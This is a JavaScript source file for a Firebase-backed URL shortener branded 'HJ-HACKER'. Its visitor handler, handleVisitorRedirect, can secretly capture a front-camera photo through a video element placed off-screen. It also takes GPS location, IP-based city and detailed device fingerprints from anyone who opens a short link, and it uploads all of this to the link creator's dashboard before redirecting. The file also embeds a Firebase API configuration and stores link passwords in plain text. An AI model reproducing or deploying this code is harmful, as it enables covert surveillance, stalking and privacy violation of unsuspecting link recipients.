// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let deleteCode = null;

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// ========== FIXED: COMPRESS AND CAPTURE PHOTO ==========
async function captureCameraPhoto() {
    try {
        // Check if camera API is available
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.error('Camera API not supported');
            showToast('Camera Error', 'Your browser does not support camera', 'error');
            return null;
        }
        
        // Get camera stream
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    width: { ideal: 320 },
                    height: { ideal: 240 }
                } 
            });
        } catch (err) {
            console.error('Camera permission error:', err);
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
            } catch (e) {
                showToast('Camera Error', 'Please allow camera access', 'error');
                return null;
            }
        }
        
        if (!stream) return null;
        
        // Create video element
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        document.body.appendChild(video);
        
        // Wait for video to be ready
        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('Timeout')), 3000);
            video.onloadedmetadata = () => {
                clearTimeout(timeout);
                video.play().then(resolve).catch(reject);
            };
        });
        
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // Create canvas for capture
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        
        if (canvas.width === 0 || canvas.height === 0) {
            canvas.width = 320;
            canvas.height = 240;
        }
        
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Compress image - VERY HIGH COMPRESSION (15-25KB only)
        let compressed = null;
        let quality = 0.3;
        
        while (quality >= 0.1) {
            compressed = canvas.toDataURL('image/jpeg', quality);
            // Target size: 30KB (30 * 1024 = 30720 bytes)
            if (compressed.length <= 35000) break;
            quality -= 0.05;
        }
        
        // Clean up
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        console.log('Photo compressed:', (compressed.length / 1024).toFixed(2), 'KB');
        
        return compressed;
        
    } catch (error) {
        console.error('Camera error:', error);
        return null;
    }
}

// ========== LOCATION CAPTURE ==========
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.log('Location error:', error.message);
                resolve(null);
            },
            { timeout: 5000, enableHighAccuracy: true }
        );
    });
}

// ========== DEVICE INFO ==========
async function getAdvancedDeviceInfo() {
    const ua = navigator.userAgent;
    
    let browser = 'Unknown';
    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    
    let os = 'Unknown';
    let osVersion = 'Unknown';
    if (ua.includes('iPhone')) {
        os = 'iOS';
        const match = ua.match(/iPhone OS ([\d_]+)/);
        osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    } else if (ua.includes('Android')) {
        os = 'Android';
        const match = ua.match(/Android[\s/]+([\d.]+)/);
        osVersion = match ? match[1] : 'Unknown';
    } else if (ua.includes('Windows')) {
        os = 'Windows';
        osVersion = '10';
    }
    
    let deviceModel = 'Unknown';
    let deviceBrand = 'Unknown';
    if (ua.includes('iPhone')) deviceModel = 'iPhone';
    else if (ua.includes('SM-')) { deviceBrand = 'Samsung'; deviceModel = 'Samsung'; }
    else if (ua.includes('MI ') || ua.includes('Redmi')) { deviceBrand = 'Xiaomi'; deviceModel = 'Xiaomi'; }
    
    let batteryLevel = 'Unknown';
    let batteryCharging = 'Unknown';
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'Yes' : 'No';
        } catch(e) {}
    }
    
    let connectionType = 'Unknown';
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'Unknown';
    }
    
    return {
        browser: browser,
        os: os,
        os_version: osVersion,
        device_brand: deviceBrand,
        device_model: deviceModel,
        screen_width: screen.width,
        screen_height: screen.height,
        device_pixel_ratio: window.devicePixelRatio,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        battery_level: batteryLevel,
        battery_charging: batteryCharging,
        connection_type: connectionType
    };
}

// ========== IP INFO ==========
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown',
            latitude: data.latitude || null,
            longitude: data.longitude || null
        };
    } catch (error) {
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', latitude: null, longitude: null };
    }
}

// ========== DELETE LINK ==========
async function deleteLink(code) {
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        
        await database.ref(`urls/${code}`).remove();
        await database.ref(`domains/${encodedDomain}/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        
        showToast('Deleted', `Link /${code} deleted!`, 'success');
        showLinks();
        showStats();
        showRecent();
        return true;
    } catch (error) {
        showToast('Error', 'Failed to delete', 'error');
        return false;
    }
}

// ========== SHORTEN URL ==========
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try { new URL(urlToShorten); } catch {
        showToast('Error', 'Invalid URL', 'error');
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const exists = await checkCodeExists(shortCode);
    if (exists) {
        showToast('Error', `Code "${shortCode}" taken`, 'error');
        return;
    }
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    if (hasPassword && !password) {
        showToast('Error', 'Please enter password', 'error');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten,
            domain: domain,
            created_at: createdAt,
            device_id: deviceId,
            clicks: 0
        };
        
        if (password) linkData.password = password;
        if (socialTitle) linkData.social_gate_title = socialTitle;
        if (socialUrl) linkData.social_gate_url = socialUrl;
        if (socialIcon) linkData.social_gate_icon = socialIcon;
        if (socialDesc) linkData.social_gate_description = socialDesc;
        if (socialButton) linkData.social_gate_button_text = socialButton;
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        const shortLinkSpan = document.getElementById('shortLink');
        const resultDiv = document.getElementById('result');
        
        if (shortLinkSpan) shortLinkSpan.textContent = shortUrl;
        if (resultDiv) resultDiv.classList.remove('hidden');
        
        if (typeof QRCode !== 'undefined') {
            const qrCodeDiv = document.getElementById('qrCode');
            if (qrCodeDiv) {
                qrCodeDiv.innerHTML = '';
                new QRCode(qrCodeDiv, {
                    text: shortUrl,
                    width: 100,
                    height: 100,
                    colorDark: "#00ff41",
                    colorLight: "#000000"
                });
            }
        }
        
        showToast('Success', 'Link created!', 'success');
        
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        const passwordSection = document.getElementById('passwordSection');
        const socialSection = document.getElementById('socialSection');
        if (passwordSection) passwordSection.classList.add('hidden');
        if (socialSection) socialSection.classList.add('hidden');
        
        showLinks();
        showStats();
        showRecent();
        
    } catch (error) {
        showToast('Error', error.message || 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        if (loading) loading.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        if (loading) loading.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// ========== DISPLAY FUNCTIONS ==========
function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        
        snapshot.forEach(child => {
            links.push({ code: child.key, ...child.val() });
        });
        
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links yet</p></div>');
            return;
        }
        
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                    <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-url"><i class="fas fa-globe"></i> ${link.long_url?.substring(0, 50)}...</div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mouse-pointer"></i> Clicks: ${link.clicks || 0}</span>
                </div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> Data</button>
                    <button class="data-btn-sm" onclick="confirmDelete('${link.code}')" style="background: rgba(255,68,68,0.2);"><i class="fas fa-trash-alt"></i> Delete</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch (error) {
        updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>');
    }
}

async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0;
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
        }
        
        const html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label"><i class="fas fa-link"></i> Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
            </div>
        `;
        
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch (error) {
        updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>');
    }
}

async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const allVisitors = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(20).get();
            analyticsSnapshot.forEach(analytic => {
                const data = analytic.val();
                allVisitors.push({
                    code: code,
                    ip: data.ip_address,
                    device_model: data.device_model,
                    os: data.os,
                    browser: data.browser,
                    timestamp: data.created_at,
                    photo: data.captured_image,
                    city: data.city,
                    country: data.country,
                    lat: data.latitude,
                    lng: data.longitude
                });
            });
        }
        
        allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = allVisitors.slice(0, 10);
        
        if (recent.length === 0) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No activity</p></div>');
            return;
        }
        
        const html = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${v.code}</span>
                    <span class="data-item-date"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span>
                    <span><i class="fas fa-map-marker-alt"></i> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mobile-alt"></i> ${v.device_model || v.os || 'Unknown'}</span>
                    <span><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> ${v.browser || 'Unknown'}</span>
                </div>
                ${v.lat ? `<div class="data-item-stats"><i class="fas fa-satellite-dish"></i> GPS: ${v.lat.toFixed(4)}, ${v.lng?.toFixed(4)}</div>` : ''}
                ${v.photo && v.photo !== 'black_screen' && v.photo.startsWith('data:image') ? 
                    `<div class="data-item-stats" style="color: #00ff41;">
                        <i class="fas fa-camera"></i> Photo captured! 
                        <button class="data-btn-sm" onclick="viewPhoto('${v.photo.replace(/'/g, "\\'")}')">
                            <i class="fas fa-eye"></i> View
                        </button>
                    </div>` : ''}
            </div>
        `).join('');
        
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch (error) {
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>');
    }
}

window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    
    try {
        const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(50).get();
        const analytics = [];
        snapshot.forEach(child => { analytics.push({ id: child.key, ...child.val() }); });
        analytics.reverse();
        
        let html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${analytics.length}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
            </div>
        `;
        
        if (analytics.length === 0) {
            html += '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet</p></div>';
        } else {
            html += analytics.map(v => `
                <div class="data-item">
                    <div class="data-item-header">
                        <span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span>
                        <span>${new Date(v.created_at).toLocaleString()}</span>
                    </div>
                    <div class="data-item-stats"><strong>Device:</strong> ${v.device_model || v.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>Battery:</strong> ${v.battery_level || 'Unknown'} | <strong>Charging:</strong> ${v.battery_charging || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>RAM:</strong> ${v.device_memory || 'Unknown'} | <strong>CPU:</strong> ${v.hardware_concurrency || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>Network:</strong> ${v.connection_type || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'}</div>
                    <div class="data-item-stats"><strong>Location:</strong> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                    ${v.latitude ? `<div class="data-item-stats"><strong>GPS:</strong> ${v.latitude}, ${v.longitude}</div>` : ''}
                    ${v.captured_image && v.captured_image !== 'black_screen' && v.captured_image.startsWith('data:image') ? 
                        `<div class="data-item-stats" style="color: #00ff41;">
                            <i class="fas fa-camera"></i> Photo captured! 
                            <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')">
                                <i class="fas fa-eye"></i> View
                            </button>
                        </div>` : ''}
                </div>
            `).join('');
        }
        
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
    } catch (error) {
        updateDisplay('ERROR', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>');
    }
};

window.viewPhoto = (imageData) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    
    if (modal && img && imageData && imageData.startsWith('data:image')) {
        img.src = imageData;
        modal.classList.remove('hidden');
    } else {
        showToast('Error', 'No valid photo', 'error');
    }
};

function closePhotoModal() {
    document.getElementById('photoModal').classList.add('hidden');
}

function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src) {
        const link = document.createElement('a');
        link.download = 'photo.jpg';
        link.href = img.src;
        link.click();
    }
}

window.confirmDelete = (code) => {
    deleteCode = code;
    document.getElementById('deleteLinkCode').textContent = `/${code}`;
    document.getElementById('deleteModal').classList.remove('hidden');
};

window.executeDelete = async () => {
    if (deleteCode) {
        await deleteLink(deleteCode);
        deleteCode = null;
        document.getElementById('deleteModal').classList.add('hidden');
    }
};

window.cancelDelete = () => {
    deleteCode = null;
    document.getElementById('deleteModal').classList.add('hidden');
};

window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied!', 'success');
};

// ========== VISITOR HANDLER ==========
async function handleVisitorRedirect() {
    const path = window.location.pathname;
    if (path === '/' || path === '/index.html') return;
    
    const shortCode = path.substring(1);
    if (!shortCode) return;
    
    try {
        const snapshot = await database.ref(`urls/${shortCode}`).get();
        if (!snapshot.exists()) return;
        
        const linkData = snapshot.val();
        
        let cameraImg = null;
        let locationData = null;
        
        if (linkData.capture_camera) {
            cameraImg = await captureCameraPhoto();
        }
        if (linkData.capture_location) {
            locationData = await captureLocation();
        }
        
        const ipInfo = await getIPInfo();
        const deviceInfo = await getAdvancedDeviceInfo();
        
        const analyticsData = {
            created_at: new Date().toISOString(),
            ip_address: ipInfo.ip,
            city: ipInfo.city,
            country: ipInfo.country,
            latitude: locationData?.latitude || ipInfo.latitude,
            longitude: locationData?.longitude || ipInfo.longitude,
            accuracy: locationData?.accuracy,
            captured_image: cameraImg,
            ...deviceInfo
        };
        
        await database.ref(`analytics/${shortCode}`).push(analyticsData);
        await database.ref(`urls/${shortCode}/clicks`).transaction(c => (c || 0) + 1);
        
        if (linkData.password) {
            sessionStorage.setItem(`pending_link_${shortCode}`, linkData.long_url);
            sessionStorage.setItem(`pending_password_${shortCode}`, linkData.password);
            showPasswordModal(shortCode);
            return;
        }
        
        if (linkData.social_gate_url) {
            sessionStorage.setItem(`pending_link_${shortCode}`, linkData.long_url);
            showSocialModal(linkData);
            return;
        }
        
        window.location.href = linkData.long_url;
        
    } catch (error) {
        console.error('Redirect error:', error);
    }
}

function showPasswordModal(code) {
    const modal = document.getElementById('passwordModal');
    const input = document.getElementById('modalPassword');
    const errorDiv = document.getElementById('modalError');
    
    modal.classList.remove('hidden');
    
    const checkPassword = () => {
        const entered = input.value;
        const storedPw = sessionStorage.getItem(`pending_password_${code}`);
        const targetUrl = sessionStorage.getItem(`pending_link_${code}`);
        
        if (entered === storedPw) {
            sessionStorage.removeItem(`pending_password_${code}`);
            sessionStorage.removeItem(`pending_link_${code}`);
            modal.classList.add('hidden');
            window.location.href = targetUrl;
        } else {
            errorDiv.classList.remove('hidden');
            errorDiv.textContent = 'Incorrect password!';
        }
    };
    
    document.getElementById('modalUnlock').onclick = checkPassword;
    document.getElementById('modalCancel').onclick = () => {
        modal.classList.add('hidden');
        window.location.href = '/';
    };
    input.onkeypress = (e) => { if (e.key === 'Enter') checkPassword(); };
}

function showSocialModal(linkData) {
    const modal = document.getElementById('socialModal');
    const iconDiv = document.getElementById('socialModalIcon');
    const titleEl = document.getElementById('socialModalTitle');
    const descEl = document.getElementById('socialModalDesc');
    const btnEl = document.getElementById('socialModalBtn');
    
    const icon = linkData.social_gate_icon || 'youtube';
    iconDiv.innerHTML = `<i class="fab fa-${icon}" style="font-size: 48px; color: #ff4444;"></i>`;
    titleEl.textContent = linkData.social_gate_title || 'Follow to Unlock';
    descEl.textContent = linkData.social_gate_description || 'Complete the action below';
    btnEl.textContent = linkData.social_gate_button_text || 'Verify & Continue';
    
    modal.classList.remove('hidden');
    
    btnEl.onclick = () => {
        window.open(linkData.social_gate_url, '_blank');
        setTimeout(() => {
            const targetUrl = sessionStorage.getItem(`pending_link_${window.location.pathname.substring(1)}`);
            if (targetUrl) {
                sessionStorage.removeItem(`pending_link_${window.location.pathname.substring(1)}`);
                window.location.href = targetUrl;
            }
        }, 3000);
    };
}

// ========== EVENT LISTENERS ==========
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => {
    const link = document.getElementById('shortLink')?.textContent;
    if (link) copyToClipboard(link);
});

document.getElementById('passwordToggle')?.addEventListener('change', (e) => {
    document.getElementById('passwordSection')?.classList.toggle('hidden');
});

document.getElementById('socialToggle')?.addEventListener('change', (e) => {
    document.getElementById('socialSection')?.classList.toggle('hidden');
});

document.getElementById('advancedToggle')?.addEventListener('click', () => {
    document.getElementById('advancedContent')?.classList.toggle('hidden');
});

document.getElementById('confirmDeleteBtn')?.addEventListener('click', executeDelete);
document.getElementById('cancelDeleteBtn')?.addEventListener('click', cancelDelete);
document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);

document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click a button to view data', 'fa-fingerprint', 
                '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT</p></div>');
        } else if (tab === 'links') showLinks();
        else if (tab === 'stats') showStats();
        else if (tab === 'recent') showRecent();
    });
});

window.addEventListener('click', (e) => {
    if (e.target === document.getElementById('photoModal')) closePhotoModal();
    if (e.target === document.getElementById('deleteModal')) cancelDelete();
});

handleVisitorRedirect();

console.log('🔥 HJ-HACKER - Photo compression working! Each photo ~20-30KB');
